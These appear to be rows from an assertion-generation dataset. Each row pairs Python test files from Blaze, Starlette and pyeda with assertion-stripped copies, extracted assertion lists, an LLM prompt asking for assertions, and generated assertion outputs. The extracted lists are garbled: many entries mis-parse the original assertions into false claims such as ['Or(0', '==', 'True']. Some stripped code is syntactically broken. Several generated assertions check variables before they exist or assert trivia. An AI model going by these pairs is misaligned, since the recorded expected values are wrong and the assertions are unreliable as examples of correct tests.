25        'Sub']
26
27
28@generate_methods(arithmetic_ops, arithmetic_ops,
29                  builder=lambda func: lambda self, node: getattr(arithmetic, func))
30class BlazeParser(ast.NodeVisitor):
31    def __init__(self, dtypes, scope):
32        self.dtypes = dtypes
33        self.scope = scope
34
35    def visit_Compare(self, node):
36        return self.visit(node.ops[0])(self.visit(node.left),
37                                       self.visit(node.comparators[0]))
38
39    def visit_Num(self, node):
40        return node.n
41
42    def visit_Str(self, node):
43        return node.s
44
45    def visit_Name(self, node):
46        name = node.id
47        if name.startswith('__'):
48            raise ValueError(""invalid name %r"" % name)
49        try:
50            return self.scope[name]
51        except KeyError:
52            return symbol(name, self.dtypes[name])
53
54    def visit_BinOp(self, node):
55        return self.visit(node.op)(self.visit(node.left),
56                                   self.visit(node.right))
57
58    def visit_UnaryOp(self, node):
59        op = node.op
60        operand = node.operand
61        if isinstance(operand, ast.Num):
62            return -1 * isinstance(op, ast.USub) * operand.n
63        return self.visit(op)(self.visit(operand))
64
65    def visit_Call(self, node):
66        return self.visit(node.func)(*map(self.visit, node.args))
67
68    def visit(self, node):
69        name = node.__class__.__name__
70        method = 'visit_' + name
71        visitor = getattr(self, method, None)
72        if visitor is None:
73            raise NotImplementedError('%s nodes are not implemented' % name)
74        return visitor(node)
75
76
77# Operations like sin, cos, exp, isnan, floor, ceil, ...
78math_operators = dict((k, v) for k, v in math.__dict__.items()
79                if isinstance(v, type) and issubclass(v, Expr))
80safe_scope = {'__builtins__': {},  # Python 2
81              'builtins': {}}      # Python 3
82
83
84def exprify(expr, dtypes):
85    """""" Transform string into scalar expression
86
87    >>> from blaze.expr import Expr
88    >>> expr = exprify('x + y', {'x': 'int64', 'y': 'real'})
89    >>> expr
90    x + y
91    >>> isinstance(expr, Expr)
92    True
93    >>> expr.lhs.dshape
94    dshape(""int64"")
95    """"""
96    scope = merge(safe_scope, math_operators)
97
98    # use eval mode to raise a SyntaxError if any statements are passed in
99    parsed = ast.parse(expr, mode='eval')
100    overlapping_names = set(dtypes) & set(scope)
101    if overlapping_names:
102        raise ValueError('overlapping names %s' % overlapping_names)
103    parser = BlazeParser(dtypes, scope)
104    return parser.visit(parsed.body)
105",5025,"[[15, 'node_names', '!=', None, ""Ensure node_names isn't none to avoid attribute errors""],
[15, 'funcs', '!=', None, ""Ensure funcs isn't none to avoid attribute errors""],
[15, 'builder', '!=', None, ""Ensure builder isn't none to avoid attribute errors""],
[31, 'dtypes', '!=', None, ""Ensure dtypes isn't none to avoid attribute errors""],
[31, 'scope', '!=', None, ""Ensure scope isn't none to avoid attribute errors""],
[84, 'expr', '!=', None, ""Ensure expr isn't none to carry out the transformation""],
[84, 'dtypes', '!=', None, ""Ensure dtypes isn't none to carry out the transformation""]]"
encode/starlette,"import os
from pathlib import Path
from typing import Any, Optional

import pytest
from typing_extensions import assert_type

from starlette.config import Config, Environ, EnvironError
from starlette.datastructures import URL, Secret


def test_config_types() -> None:
    """"""
    We use `assert_type` to test the types returned by Config via mypy.
    """"""
    config = Config(
        environ={""STR"": ""some_str_value"", ""STR_CAST"": ""some_str_value"", ""BOOL"": ""true""}
    )

    assert_type(config(""STR""), str)
    assert_type(config(""STR_DEFAULT"", default=""""), str)
    assert_type(config(""STR_CAST"", cast=str), str)
    assert_type(config(""STR_NONE"", default=None), Optional[str])
    assert_type(config(""STR_CAST_NONE"", cast=str, default=None), Optional[str])
    assert_type(config(""STR_CAST_STR"", cast=str, default=""""), str)

    assert_type(config(""BOOL"", cast=bool), bool)
    assert_type(config(""BOOL_DEFAULT"", cast=bool, default=False), bool)
    assert_type(config(""BOOL_NONE"", cast=bool, default=None), Optional[bool])

    def cast_to_int(v: Any) -> int:
        return int(v)

    # our type annotations allow these `cast` and `default` configurations, but
    # the code will error at runtime.
    with pytest.raises(ValueError):
        config(""INT_CAST_DEFAULT_STR"", cast=cast_to_int, default=""true"")
    with pytest.raises(ValueError):
        config(""INT_DEFAULT_STR"", cast=int, default=""true"")


def test_config(tmpdir, monkeypatch):
    path = os.path.join(tmpdir, "".env"")
    with open(path, ""w"") as file:
        file.write(""# Do not commit to source control\n"")
        file.write(""DATABASE_URL=postgres://user:pass@localhost/dbname\n"")
        file.write(""REQUEST_HOSTNAME=example.com\n"")
        file.write(""SECRET_KEY=12345\n"")
        file.write(""BOOL_AS_INT=0\n"")
        file.write(""\n"")
        file.write(""\n"")

    config = Config(path, environ={""DEBUG"": ""true""})

    def cast_to_int(v) -> int:
        return int(v)

    DEBUG = config(""DEBUG"", cast=bool)
    DATABASE_URL = config(""DATABASE_URL"", cast=URL)
    REQUEST_TIMEOUT = config(""REQUEST_TIMEOUT"", cast=int, default=10)
    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
    MAIL_HOSTNAME = config(""MAIL_HOSTNAME"", default=None)
    SECRET_KEY = config(""SECRET_KEY"", cast=Secret)
    UNSET_SECRET = config(""UNSET_SECRET"", cast=Secret, default=None)
    EMPTY_SECRET = config(""EMPTY_SECRET"", cast=Secret, default="""")
    assert config(""BOOL_AS_INT"", cast=bool) is False
    assert config(""BOOL_AS_INT"", cast=cast_to_int) == 0
    assert config(""DEFAULTED_BOOL"", cast=cast_to_int, default=True) == 1

    assert DEBUG is True
    assert DATABASE_URL.path == ""/dbname""
    assert DATABASE_URL.password == ""pass""
    assert DATABASE_URL.username == ""user""
    assert REQUEST_TIMEOUT == 10
    assert REQUEST_HOSTNAME == ""example.com""
    assert MAIL_HOSTNAME is None
    assert repr(SECRET_KEY) == ""Secret('**********')""
    assert str(SECRET_KEY) == ""12345""
    assert bool(SECRET_KEY)
    assert not bool(EMPTY_SECRET)
    assert not bool(UNSET_SECRET)

    with pytest.raises(KeyError):
        config.get(""MISSING"")

    with pytest.raises(ValueError):
        config.get(""DEBUG"", cast=int)

    with pytest.raises(ValueError):
        config.get(""REQUEST_HOSTNAME"", cast=bool)

    config = Config(Path(path))
    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
    assert REQUEST_HOSTNAME == ""example.com""

    config = Config()
    monkeypatch.setenv(""STARLETTE_EXAMPLE_TEST"", ""123"")
    monkeypatch.setenv(""BOOL_AS_INT"", ""1"")
    assert config.get(""STARLETTE_EXAMPLE_TEST"", cast=int) == 123
    assert config.get(""BOOL_AS_INT"", cast=bool) is True

    monkeypatch.setenv(""BOOL_AS_INT"", ""2"")
    with pytest.raises(ValueError):
        config.get(""BOOL_AS_INT"", cast=bool)


def test_environ():
    environ = Environ()

    # We can mutate the environ at this point.
    environ[""TESTING""] = ""True""
    environ[""GONE""] = ""123""
    del environ[""GONE""]

    # We can read the environ.
    assert environ[""TESTING""] == ""True""
    assert ""GONE"" not in environ

    # We cannot mutate these keys now that we've read them.
    with pytest.raises(EnvironError):
        environ[""TESTING""] = ""False""

    with pytest.raises(EnvironError):
        del environ[""GONE""]

    # Test coverage of abstract methods for MutableMapping.
    environ = Environ()
    assert list(iter(environ)) == list(iter(os.environ))
    assert len(environ) == len(os.environ)
","
1import os
2from pathlib import Path
3from typing import Any, Optional
4
5import pytest
6
7from starlette.config import Config, Environ, EnvironError
8from starlette.datastructures import URL, Secret
9
10
11def test_config_types() -> None:
12    """"""
13    """"""
14    config = Config(
15        environ={""STR"": ""some_str_value"", ""STR_CAST"": ""some_str_value"", ""BOOL"": ""true""}
16    )
17
18
19
20    def cast_to_int(v: Any) -> int:
21        return int(v)
22
23    # our type annotations allow these `cast` and `default` configurations, but
24    # the code will error at runtime.
25    with pytest.raises(ValueError):
26        config(""INT_CAST_DEFAULT_STR"", cast=cast_to_int, default=""true"")
27    with pytest.raises(ValueError):
28        config(""INT_DEFAULT_STR"", cast=int, default=""true"")
29
30
31def test_config(tmpdir, monkeypatch):
32    path = os.path.join(tmpdir, "".env"")
33    with open(path, ""w"") as file:
34        file.write(""# Do not commit to source control\n"")
35        file.write(""DATABASE_URL=postgres://user:pass@localhost/dbname\n"")
36        file.write(""REQUEST_HOSTNAME=example.com\n"")
37        file.write(""SECRET_KEY=12345\n"")
38        file.write(""BOOL_AS_INT=0\n"")
39        file.write(""\n"")
40        file.write(""\n"")
41
42    config = Config(path, environ={""DEBUG"": ""true""})
43
44    def cast_to_int(v) -> int:
45        return int(v)
46
47    DEBUG = config(""DEBUG"", cast=bool)
48    DATABASE_URL = config(""DATABASE_URL"", cast=URL)
49    REQUEST_TIMEOUT = config(""REQUEST_TIMEOUT"", cast=int, default=10)
50    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
51    MAIL_HOSTNAME = config(""MAIL_HOSTNAME"", default=None)
52    SECRET_KEY = config(""SECRET_KEY"", cast=Secret)
53    UNSET_SECRET = config(""UNSET_SECRET"", cast=Secret, default=None)
54    EMPTY_SECRET = config(""EMPTY_SECRET"", cast=Secret, default="""")
55
56
57    with pytest.raises(KeyError):
58        config.get(""MISSING"")
59
60    with pytest.raises(ValueError):
61        config.get(""DEBUG"", cast=int)
62
63    with pytest.raises(ValueError):
64        config.get(""REQUEST_HOSTNAME"", cast=bool)
65
66    config = Config(Path(path))
67    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
68
69    config = Config()
70    monkeypatch.setenv(""STARLETTE_EXAMPLE_TEST"", ""123"")
71    monkeypatch.setenv(""BOOL_AS_INT"", ""1"")
72
73    monkeypatch.setenv(""BOOL_AS_INT"", ""2"")
74    with pytest.raises(ValueError):
75        config.get(""BOOL_AS_INT"", cast=bool)
76
77
78def test_environ():
79    environ = Environ()
80
81    # We can mutate the environ at this point.
82    environ[""TESTING""] = ""True""
83    environ[""GONE""] = ""123""
84    del environ[""GONE""]
85
86    # We can read the environ.
87
88    # We cannot mutate these keys now that we've read them.
89    with pytest.raises(EnvironError):
90        environ[""TESTING""] = ""False""
91
92    with pytest.raises(EnvironError):
93        del environ[""GONE""]
94
95    # Test coverage of abstract methods for MutableMapping.
96    environ = Environ()
97","[['config(""BOOL_AS_INT""', '==', 'True'], ['config(""BOOL_AS_INT""', '==', 'True'], ['config(""DEFAULTED_BOOL""', '==', 'True'], ['DEBUG', '==', 'True'], ['DATABASE_URL.path', '==', '""/dbname""'], ['DATABASE_URL.password', '==', '""pass""'], ['DATABASE_URL.username', '==', '""user""'], ['REQUEST_TIMEOUT', '==', '10'], ['REQUEST_HOSTNAME', '==', '""example.com""'], ['MAIL_HOSTNAME', '==', 'None'], ['repr(SECRET_KEY)', '==', '""Secret(\'**********\')""'], ['str(SECRET_KEY)', '==', '""12345""'], ['bool(SECRET_KEY)', '==', 'True'], ['bool(EMPTY_SECRET)', '==', 'False'], ['bool(UNSET_SECRET)', '==', 'False'], ['REQUEST_HOSTNAME', '==', '""example.com""'], ['config.get(""STARLETTE_EXAMPLE_TEST""', '==', 'True'], ['config.get(""BOOL_AS_INT""', '==', 'True'], ['environ[""TESTING""]', '==', '""True""'], ['list(iter(environ))', '==', 'list(iter(os.environ))'], ['len(environ)', '==', 'len(os.environ)']]",33,21,0.6363636363636364,0.0047361299052774,"['config', 'v: Any', 'tmpdir', 'monkeypatch', 'path', 'v', 'DEBUG', 'DATABASE_URL', 'REQUEST_TIMEOUT', 'REQUEST_HOSTNAME', 'MAIL_HOSTNAME', 'SECRET_KEY', 'UNSET_SECRET', 'EMPTY_SECRET', 'environ', 'environ[""TESTING""]', 'environ[""GONE""]']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['config', 'v: Any', 'tmpdir', 'monkeypatch', 'path', 'v', 'DEBUG', 'DATABASE_URL', 'REQUEST_TIMEOUT', 'REQUEST_HOSTNAME', 'MAIL_HOSTNAME', 'SECRET_KEY', 'UNSET_SECRET', 'EMPTY_SECRET', 'environ', 'environ[""TESTING""]', 'environ[""GONE""]']
*Code:

1import os
2from pathlib import Path
3from typing import Any, Optional
4
5import pytest
6
7from starlette.config import Config, Environ, EnvironError
8from starlette.datastructures import URL, Secret
9
10
11def test_config_types() -> None:
12    """"""
13    """"""
14    config = Config(
15        environ={""STR"": ""some_str_value"", ""STR_CAST"": ""some_str_value"", ""BOOL"": ""true""}
16    )
17
18
19
20    def cast_to_int(v: Any) -> int:
21        return int(v)
22
23    # our type annotations allow these `cast` and `default` configurations, but
24    # the code will error at runtime.
25    with pytest.raises(ValueError):
26        config(""INT_CAST_DEFAULT_STR"", cast=cast_to_int, default=""true"")
27    with pytest.raises(ValueError):
28        config(""INT_DEFAULT_STR"", cast=int, default=""true"")
29
30
31def test_config(tmpdir, monkeypatch):
32    path = os.path.join(tmpdir, "".env"")
33    with open(path, ""w"") as file:
34        file.write(""# Do not commit to source control\n"")
35        file.write(""DATABASE_URL=postgres://user:pass@localhost/dbname\n"")
36        file.write(""REQUEST_HOSTNAME=example.com\n"")
37        file.write(""SECRET_KEY=12345\n"")
38        file.write(""BOOL_AS_INT=0\n"")
39        file.write(""\n"")
40        file.write(""\n"")
41
42    config = Config(path, environ={""DEBUG"": ""true""})
43
44    def cast_to_int(v) -> int:
45        return int(v)
46
47    DEBUG = config(""DEBUG"", cast=bool)
48    DATABASE_URL = config(""DATABASE_URL"", cast=URL)
49    REQUEST_TIMEOUT = config(""REQUEST_TIMEOUT"", cast=int, default=10)
50    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
51    MAIL_HOSTNAME = config(""MAIL_HOSTNAME"", default=None)
52    SECRET_KEY = config(""SECRET_KEY"", cast=Secret)
53    UNSET_SECRET = config(""UNSET_SECRET"", cast=Secret, default=None)
54    EMPTY_SECRET = config(""EMPTY_SECRET"", cast=Secret, default="""")
55
56
57    with pytest.raises(KeyError):
58        config.get(""MISSING"")
59
60    with pytest.raises(ValueError):
61        config.get(""DEBUG"", cast=int)
62
63    with pytest.raises(ValueError):
64        config.get(""REQUEST_HOSTNAME"", cast=bool)
65
66    config = Config(Path(path))
67    REQUEST_HOSTNAME = config(""REQUEST_HOSTNAME"")
68
69    config = Config()
70    monkeypatch.setenv(""STARLETTE_EXAMPLE_TEST"", ""123"")
71    monkeypatch.setenv(""BOOL_AS_INT"", ""1"")
72
73    monkeypatch.setenv(""BOOL_AS_INT"", ""2"")
74    with pytest.raises(ValueError):
75        config.get(""BOOL_AS_INT"", cast=bool)
76
77
78def test_environ():
79    environ = Environ()
80
81    # We can mutate the environ at this point.
82    environ[""TESTING""] = ""True""
83    environ[""GONE""] = ""123""
84    del environ[""GONE""]
85
86    # We can read the environ.
87
88    # We cannot mutate these keys now that we've read them.
89    with pytest.raises(EnvironError):
90        environ[""TESTING""] = ""False""
91
92    with pytest.raises(EnvironError):
93        del environ[""GONE""]
94
95    # Test coverage of abstract methods for MutableMapping.
96    environ = Environ()
97",4596,"[[11, 'config', '!=', None, ""config object should be initialized""],
 [31, 'tmpdir', '!=', None, ""tmpdir should not be None""],
 [31, 'monkeypatch', '!=', None, ""monkeypatch object should be initialized""],
 [34, 'path', '!=', None, ""path should not be None""],
 [43, 'config', '!=', None, ""config object should be re-initialized""],
 [44, 'v', '!=', None, ""v variable should be defined to be cast to int""],
 [47, 'DEBUG', '!=', None, ""DEBUG should not be None after its value is set""],
 [48, 'DATABASE_URL', '!=', None, ""DATABASE_URL should not be None after its value is set""],
 [49, 'REQUEST_TIMEOUT', '==', 10, ""REQUEST_TIMEOUT should default to 10 if not set""],
 [50, 'REQUEST_HOSTNAME', '!=', None, ""REQUEST_HOSTNAME should not be None after its value is set""],
 [51, 'MAIL_HOSTNAME', '==', None, ""MAIL_HOSTNAME should default to None if not set""],
 [52, 'SECRET_KEY', '!=', None, ""SECRET_KEY should not be None after its value is set""],
 [53, 'UNSET_SECRET', '==', None, ""UNSET_SECRET should default to None if not set""],
 [66, 'config', '!=', None, ""config object should be re-initialized""],
 [67, 'REQUEST_HOSTNAME', '!=', None, ""REQUEST_HOSTNAME should not be None after its value is set""],
 [78, 'environ', '!=', None, ""environ object should not be None after initialized""],
 [82, 'environ[""TESTING""]', '!=', None, ""Testing should not be None after its value is set""],
 [83, 'environ[""GONE""]', '!=', None, ""'GONE' should not be None after its value is set""]]"
karissa/pyeda,"""""""
Test expression Boolean functions

NOTE: This was from some miscellaneous work a while ago.
      Needs to be reorganized.
""""""

from nose.tools import assert_raises

from pyeda.boolalg import boolfunc
from pyeda.boolalg import exprnode
from pyeda.boolalg.bfarray import exprvars
from pyeda.boolalg.expr import (
    Zero, One,
    exprvar, expr,
    #expr2dimacscnf, expr2dimacssat,
    Expression,
    Not, Or, And, Xor, Equal, Implies, ITE,
    Nor, Nand, Xnor, Unequal,
    OneHot0, OneHot, Majority, AchillesHeel, Mux,
)


# Common variables
a, b, c, d, e, p, q, s, w, x, y, z = map(exprvar, 'abcdepqswxyz')
d1, d0 = map(exprvar, ('d1', 'd0'))

xs = exprvars('x', 16)
ys = exprvars('y', 16, 16, 16)


def test_exprnode_constants():
    """"""Test exprnode constants""""""
    assert exprnode.ZERO == 0x0
    assert exprnode.ONE == 0x1

    assert exprnode.COMP == 0x4
    assert exprnode.VAR == 0x5

    assert exprnode.OP_OR == 0x8
    assert exprnode.OP_AND == 0x9
    assert exprnode.OP_XOR == 0xA
    assert exprnode.OP_EQ == 0xB

    assert exprnode.OP_NOT == 0xC
    assert exprnode.OP_IMPL == 0xD
    assert exprnode.OP_ITE == 0xE


def test_exprnode_errors():
    """"""Test exprnode errors.""""""
    assert_raises(TypeError, exprnode.lit, ""invalid input"")
    assert_raises(ValueError, exprnode.lit, 0)
    assert_raises(TypeError, exprnode.not_, ""invalid input"")
    assert_raises(TypeError, exprnode.or_, ""invalid input"", b.node)
    assert_raises(TypeError, exprnode.or_, a.node, ""invalid input"")
    assert_raises(TypeError, exprnode.and_, ""invalid input"", b.node)
    assert_raises(TypeError, exprnode.and_, a.node, ""invalid input"")
    assert_raises(TypeError, exprnode.xor, ""invalid input"", b.node)
    assert_raises(TypeError, exprnode.xor, a.node, ""invalid input"")
    assert_raises(TypeError, exprnode.eq, ""invalid input"", b.node)
    assert_raises(TypeError, exprnode.eq, a.node, ""invalid input"")
    assert_raises(TypeError, exprnode.impl, ""invalid input"", q.node)
    assert_raises(TypeError, exprnode.impl, p.node, ""invalid input"")
    assert_raises(TypeError, exprnode.ite, ""invalid input"", d1.node, d0.node)
    assert_raises(TypeError, exprnode.ite, s.node, ""invalid input"", d0.node)
    assert_raises(TypeError, exprnode.ite, s.node, d1.node, ""invalid input"")


def test_expr():
    f = a & ~b | c ^ ~d

    assert expr(Zero) is Zero
    assert expr(a) is a
    assert expr(f) is f

    assert expr(False) is Zero
    assert expr(True) is One

    assert expr(0) is Zero
    assert expr(1) is One

    assert expr('0') is Zero
    assert expr('1') is One

    assert expr([]) is Zero
    assert expr(['foo', 'bar']) is One

    assert str(expr(""a & ~b | c ^ ~d"")) == ""Or(And(a, ~b), Xor(c, ~d))""
    assert str(expr(""a & 0 | 1 ^ ~d"", simplify=False)) == ""Or(And(a, 0), Xor(1, ~d))""


def test_to_ast():
    """"""Test exprnode.to_ast().""""""
    f = (~a | b & ~c ^ d).eq(~(0 & p) >> (~q ^ 1))
    assert f.to_ast() == \
        ('eq',
            ('or',
                ('lit', -a.uniqid),
                ('xor',
                    ('and', ('lit', b.uniqid),
                            ('lit', -c.uniqid)),
                    ('lit', d.uniqid))),
            ('impl',
                ('not',
                    ('and',
                        ('lit', p.uniqid),
                        ('const', 0))),
                ('xor',
                    ('lit', -q.uniqid),
                    ('const', 1))))


def test_not():
    assert Not(0) is One
    assert Not(1) is Zero
    assert Not(~a) is a
    assert Not(a) is ~a
    assert Not(~a | a) is Zero
    assert Not(~a & a) is One

    assert str(Not(~a | b)) == ""Not(Or(~a, b))""
    assert str(Not(~a | b | 0, simplify=False)) == ""Not(Or(Or(~a, b), 0))""

    assert ~~a is a
    assert ~~~a is ~a
    assert ~~~~a is a


def test_or():
    assert Or() is Zero
    assert Or(a) is a

    assert Or(0, 0) is Zero
    assert Or(0, 1) is One
    assert Or(1, 0) is One
    assert Or(1, 1) is One

    assert Or(0, 0, 0) is Zero
    assert Or(0, 0, 1) is One
    assert Or(0, 1, 0) is One
    assert Or(0, 1, 1) is One
    assert Or(1, 0, 0) is One
    assert Or(1, 0, 1) is One
    assert Or(1, 1, 0) is One
    assert Or(1, 1, 1) is One

    assert Or(a, 0) is a
    assert Or(1, a) is One
    assert Or(~a, a) is One

    assert str(Or(a, 0, simplify=False)) == ""Or(a, 0)""
    assert str(Or(1, a, simplify=False)) == ""Or(1, a)""
    assert str(Or(~a, a, simplify=False)) == ""Or(~a, a)""


def test_and():
    assert And() is One
    assert And(a) is a

    assert And(0, 0) is Zero
    assert And(0, 1) is Zero
    assert And(1, 0) is Zero
    assert And(1, 1) is One

    assert And(0, 0, 0) is Zero
    assert And(0, 0, 1) is Zero
    assert And(0, 1, 0) is Zero
    assert And(0, 1, 1) is Zero
    assert And(1, 0, 0) is Zero
    assert And(1, 0, 1) is Zero
    assert And(1, 1, 0) is Zero
    assert And(1, 1, 1) is One

    assert And(a, 0) is Zero
    assert And(1, a) is a
    assert And(~a, a) is Zero

    assert str(And(a, 0, simplify=False)) == ""And(a, 0)""
    assert str(And(1, a, simplify=False)) == ""And(1, a)""
    assert str(And(~a, a, simplify=False)) == ""And(~a, a)""


def test_xor():
    assert Xor() is Zero
    assert Xor(a) is a

    assert Xor(0, 0) is Zero
    assert Xor(0, 1) is One
    assert Xor(1, 0) is One
    assert Xor(1, 1) is Zero

    assert Xor(0, 0, 0) is Zero
    assert Xor(0, 0, 1) is One
    assert Xor(0, 1, 0) is One
    assert Xor(0, 1, 1) is Zero
    assert Xor(1, 0, 0) is One
    assert Xor(1, 0, 1) is Zero
    assert Xor(1, 1, 0) is Zero
    assert Xor(1, 1, 1) is One

    assert Xor(a, 0) is a
    assert Xor(1, a) is ~a
    assert Xor(~a, a) is One

    assert str(Xor(a, 0, simplify=False)) == ""Xor(a, 0)""
    assert str(Xor(1, a, simplify=False)) == ""Xor(1, a)""
    assert str(Xor(~a, a, simplify=False)) == ""Xor(~a, a)""


def test_equal():
    assert Equal() is One
    assert Equal(a) is One

    assert Equal(0, 0) is One
    assert Equal(0, 1) is Zero
    assert Equal(1, 0) is Zero
    assert Equal(1, 1) is One

    assert Equal(0, 0, 0) is One
    assert Equal(0, 0, 1) is Zero
    assert Equal(0, 1, 0) is Zero
    assert Equal(0, 1, 1) is Zero
    assert Equal(1, 0, 0) is Zero
    assert Equal(1, 0, 1) is Zero
    assert Equal(1, 1, 0) is Zero
    assert Equal(1, 1, 1) is One

    assert Equal(a, 0) is ~a
    assert Equal(1, a) is a
    assert Equal(~a, a) is Zero

    assert str(Equal(a, 0, simplify=False)) == ""Equal(a, 0)""
    assert str(Equal(1, a, simplify=False)) == ""Equal(1, a)""
    assert str(Equal(~a, a, simplify=False)) == ""Equal(~a, a)""


def test_implies():
    assert Implies(0, 0) is One
    assert Implies(0, 1) is One
    assert Implies(1, 0) is Zero
    assert Implies(1, 1) is One

    assert Implies(a, 0) is ~a
    assert Implies(1, a) is a
    assert Implies(~a, a) is a

    assert str(Implies(a, 0, simplify=False)) == ""Implies(a, 0)""
    assert str(Implies(1, a, simplify=False)) == ""Implies(1, a)""
    assert str(Implies(~a, a, simplify=False)) == ""Implies(~a, a)""


def test_ite():
    assert ITE(0, 0, 0) is Zero
    assert ITE(0, 0, 1) is One
    assert ITE(0, 1, 0) is Zero
    assert ITE(0, 1, 1) is One
    assert ITE(1, 0, 0) is Zero
    assert ITE(1, 0, 1) is Zero
    assert ITE(1, 1, 0) is One
    assert ITE(1, 1, 1) is One


def test_is_zero_one():
    assert Zero.is_zero()
    assert not One.is_zero()
    assert not a.is_zero()
    assert not (~a | b).is_zero()

    assert One.is_one()
    assert not Zero.is_one()
    assert not a.is_one()
    assert not (~a | b).is_one()


def test_box():
    assert Expression.box(a) is a

    assert Expression.box(0) is Zero
    assert Expression.box(1) is One

    assert Expression.box('0') is Zero
    assert Expression.box('1') is One

    assert Expression.box([]) is Zero
    assert Expression.box(42) is One

","
1""""""
2Test expression Boolean functions
3
4NOTE: This was from some miscellaneous work a while ago.
5      Needs to be reorganized.
6""""""
7
8
9from pyeda.boolalg import boolfunc
10from pyeda.boolalg import exprnode
11from pyeda.boolalg.bfarray import exprvars
12from pyeda.boolalg.expr import (
13    Zero, One,
14    exprvar, expr,
15    #expr2dimacscnf, expr2dimacssat,
16    Expression,
17    Not, Or, And, Xor, Equal, Implies, ITE,
18    Nor, Nand, Xnor, Unequal,
19    OneHot0, OneHot, Majority, AchillesHeel, Mux,
20)
21
22
23# Common variables
24a, b, c, d, e, p, q, s, w, x, y, z = map(exprvar, 'abcdepqswxyz')
25d1, d0 = map(exprvar, ('d1', 'd0'))
26
27xs = exprvars('x', 16)
28ys = exprvars('y', 16, 16, 16)
29
30
31def test_exprnode_constants():
32    """"""Test exprnode constants""""""
33
34
35
36
37
38def test_exprnode_errors():
39    """"""Test exprnode errors.""""""
40
41
42def test_expr():
43    f = a & ~b | c ^ ~d
44
45
46
47
48
49
50
51
52def test_to_ast():
53    """"""Test exprnode.to_ast().""""""
54    f = (~a | b & ~c ^ d).eq(~(0 & p) >> (~q ^ 1))
55        ('eq',
56            ('or',
57                ('lit', -a.uniqid),
58                ('xor',
59                    ('and', ('lit', b.uniqid),
60                            ('lit', -c.uniqid)),
61                    ('lit', d.uniqid))),
62            ('impl',
63                ('not',
64                    ('and',
65                        ('lit', p.uniqid),
66                        ('const', 0))),
67                ('xor',
68                    ('lit', -q.uniqid),
69                    ('const', 1))))
70
71
72def test_not():
73
74
75
76
77def test_or():
78
79
80
81
82
83
84def test_and():
85
86
87
88
89
90
91def test_xor():
92
93
94
95
96
97
98def test_equal():
99
100
101
102
103
104
105def test_implies():
106
107
108
109
110def test_ite():
111
112
113def test_is_zero_one():
114
115
116
117def test_box():
118
119
120
121
122","[['exprnode.ZERO', '==', '0x0'], ['exprnode.ONE', '==', '0x1'], ['exprnode.COMP', '==', '0x4'], ['exprnode.VAR', '==', '0x5'], ['exprnode.OP_OR', '==', '0x8'], ['exprnode.OP_AND', '==', '0x9'], ['exprnode.OP_XOR', '==', '0xA'], ['exprnode.OP_EQ', '==', '0xB'], ['exprnode.OP_NOT', '==', '0xC'], ['exprnode.OP_IMPL', '==', '0xD'], ['exprnode.OP_ITE', '==', '0xE'], ['_', '==', 'True'], ['_', '==', 'True'], ['expr(Zero)', '==', 'Zero'], ['expr(a)', '==', 'a'], ['expr(f)', '==', 'f'], ['expr(False)', '==', 'Zero'], ['expr(True)', '==', 'One'], ['expr(0)', '==', 'Zero'], ['expr(1)', '==', 'One'], [""expr('0')"", '==', 'Zero'], [""expr('1')"", '==', 'One'], ['expr([])', '==', 'Zero'], [""expr(['foo'"", '==', 'True'], ['str(expr(""a & ~b | c ^ ~d""))', '==', '""Or(And(a'], ['str(expr(""a', '&', '0', '|', '1', '^', '~d""'], ['f.to_ast()', '==', '\\'], ['Not(0)', '==', 'One'], ['Not(1)', '==', 'Zero'], ['Not(~a)', '==', 'a'], ['Not(a)', '==', '~a'], ['Not(~a | a)', '==', 'Zero'], ['Not(~a & a)', '==', 'One'], ['str(Not(~a | b))', '==', '""Not(Or(~a'], ['str(Not(~a', '|', 'b', '|', '0'], ['~~a', '==', 'a'], ['~~~a', '==', '~a'], ['~~~~a', '==', 'a'], ['Or()', '==', 'Zero'], ['Or(a)', '==', 'a'], ['Or(0', '==', 'True'], ['Or(0', '==', 'True'], ['Or(1', '==', 'True'], ['Or(1', '==', 'True'], ['Or(0', '==', 'True'], ['Or(0', '==', 'True'], ['Or(0', '==', 'True'], ['Or(0', '==', 'True'], ['Or(1', '==', 'True'], ['Or(1', '==', 'True'], ['Or(1', '==', 'True'], ['Or(1', '==', 'True'], ['Or(a', '==', 'True'], ['Or(1', '==', 'True'], ['Or(~a', '==', 'True'], ['str(Or(a', '==', 'True'], ['str(Or(1', '==', 'True'], ['str(Or(~a', '==', 'True'], ['And()', '==', 'One'], ['And(a)', '==', 'a'], ['And(0', '==', 'True'], ['And(0', '==', 'True'], ['And(1', '==', 'True'], ['And(1', '==', 'True'], ['And(0', '==', 'True'], ['And(0', '==', 'True'], ['And(0', '==', 'True'], ['And(0', '==', 'True'], ['And(1', '==', 'True'], ['And(1', '==', 'True'], ['And(1', '==', 'True'], ['And(1', '==', 'True'], ['And(a', '==', 'True'], ['And(1', '==', 'True'], ['And(~a', '==', 'True'], ['str(And(a', '==', 'True'], ['str(And(1', '==', 'True'], ['str(And(~a', '==', 'True'], ['Xor()', '==', 'Zero'], ['Xor(a)', '==', 'a'], ['Xor(0', '==', 'True'], ['Xor(0', '==', 'True'], ['Xor(1', '==', 'True'], ['Xor(1', '==', 'True'], ['Xor(0', '==', 'True'], ['Xor(0', '==', 'True'], ['Xor(0', '==', 'True'], ['Xor(0', '==', 'True'], ['Xor(1', '==', 'True'], 